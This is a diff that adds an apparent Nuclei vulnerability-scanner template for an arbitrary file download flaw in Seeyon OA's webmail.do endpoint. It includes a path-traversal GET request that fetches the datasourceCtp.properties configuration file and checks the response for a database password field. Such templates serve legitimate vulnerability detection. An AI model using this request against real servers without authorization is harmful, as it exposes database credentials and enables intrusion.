@@ -1,0 +1,33 @@
+id: CNVD-2020-62422
+info:
+  name: Seeyon OA webmail.do Arbitrary File Download
+  author:
+  - l0ne1y
+  description: |-
+    Seeyon OA webmail.do Arbitrary File Download
+    Seeyon OA has an arbitrary file download vulnerability. An arbitrary file download vulnerability differs from website directory browsing: it allows traversing files under the web directory and even browsing or downloading files elsewhere in the system. Attackers can use directory traversal attacks to obtain system files and server configuration files. Generally, attackers exploit server APIs and standard file permissions to launch attacks. An arbitrary file read/download vulnerability may exist in the web server software itself or in web applications.
+  severity: medium
+  remediation: |-
+    #### Official remediation:
+    Upgrade the system to a version without the vulnerability, or download the security patch from the official website
+    [http://service.seeyon.com/patchtools/tp.html#/patchList?type=%E5%AE%89%E5%85%A8%E8%A1%A5%E4%B8%81&id=64](http://service.seeyon.com/patchtools/tp.html#/patchList?type=%E5%AE%89%E5%85%A8%E8%A1%A5%E4%B8%81&id=64)
+    [http://service.seeyon.com/patchtools/tp.html#/patchList?type=%E5%AE%89%E5%85%A8%E8%A1%A5%E4%B8%81&id=65](http://service.seeyon.com/patchtools/tp.html#/patchList?type=%E5%AE%89%E5%85%A8%E8%A1%A5%E4%B8%81&id=65)
+requests:
+- matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    condition: and
+    part: header
+    words:
+    - application/x-msdownload
+  - type: word
+    condition: and
+    part: body
+    words:
+    - ctpDataSource.password
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties'
+  method: GET
